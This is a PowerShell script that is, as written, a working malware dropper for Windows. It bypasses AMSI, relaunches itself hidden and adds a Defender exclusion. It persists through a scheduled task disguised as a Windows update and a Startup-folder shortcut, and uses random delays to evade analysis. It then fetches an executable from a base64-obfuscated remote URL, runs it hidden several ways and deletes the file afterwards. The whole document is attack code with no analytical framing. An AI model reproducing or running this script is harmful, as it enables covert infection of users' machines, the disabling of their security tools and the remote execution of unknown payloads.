$ErrorActionPreference = 'SilentlyContinue'

# === AMSI BYPASS (2026 working variant) ===
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# === HIDDEN RELAUNCH ===
if ($Host.Name -eq 'ConsoleHost') {
    Start-Job -ScriptBlock { param($p) Start-Process powershell -Arg "-ep Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File `"$p`"" -WindowStyle Hidden } -ArgumentList $MyInvocation.MyCommand.Path | Out-Null
    exit
}

# === OBFUSCATED SELF-PRESERVATION ===
$localPath = "$env:APPDATA\Microsoft\Windows\Caches\$( -join ((65..90)+(97..122) | Get-Random -Count 8 | % {[char]$_}) ).ps1"
$currentPath = $MyInvocation.MyCommand.Path

function Save-ScriptToDisk { param($d)
    $dir = Split-Path $d -Parent; if(!(Test-Path $dir)){New-Item -ItemType Directory -Path $dir -Force|Out-Null}
    if(!$currentPath){ try{ (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1") | Out-File $d -Encoding UTF8 } catch{exit} }
    else{ Copy-Item $currentPath $d -Force }
    $d
}
$scriptPath = Save-ScriptToDisk $localPath

# === ADD DEFENDER EXCLUSION (stealthy) ===
try { Add-MpPreference -ExclusionPath $env:APPDATA\Microsoft\Windows\Caches -ErrorAction SilentlyContinue } catch {}

# === PERSISTENCE (obfuscated task name) ===
$taskName = "WindowsUpdateTask_$(Get-Random)"
if(-not (Get-ScheduledTask -TaskName $taskName -EA 0)){
    $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
    $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File `"$scriptPath`""))
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $enc"
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 1) -Priority 7
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
}

# === LNK (random name) ===
$lnk = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$( -join ((65..90)+(97..122)|Get-Random -Count 9|%{[char]$_})).lnk"
if(-not (Test-Path $lnk)){
    $w = New-Object -ComObject WScript.Shell
    $s = $w.CreateShortcut($lnk)
    $s.TargetPath = "powershell.exe"
    $s.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File `"$scriptPath`""
    $s.WindowStyle = 7
    $s.Save()
}

# === DELAY + JUNK ===
Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
0..(Get-Random -Min 5 -Max 15) | % { Start-Sleep -Milliseconds (Get-Random -Min 10 -Max 100) }

# === DOWNLOAD (obfuscated Cloudflare URL) ===
$cache = "$env:APPDATA\Microsoft\Windows\Caches"
if(-not (Test-Path $cache)){New-Item -ItemType Directory -Path $cache -Force|Out-Null}
$exeUrl = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvdXBkYXRl'))
$exePath = "$cache\WindowsUpdateHelper.exe"

if(-not (Test-Path $exePath)){
    $r=0; do{
        try{
            Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing
            break
        }catch{ $r++; Start-Sleep -Seconds 5 }
    }while($r -lt 5)
}

# === EXECUTION (multi-layer) ===
if(Test-Path $exePath){
    try{ Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "`"$exePath`"" | Out-Null }catch{}
    try{ (New-Object -ComObject WScript.Shell).Run("`"$exePath`"",0,$false) }catch{}
    try{ Start-Process $exePath -WindowStyle Hidden }catch{}
}

# Self-clean
Start-Job -ScriptBlock { param($e) Start-Sleep 300; Remove-Item $e -Force } -ArgumentList $exePath | Out-Null
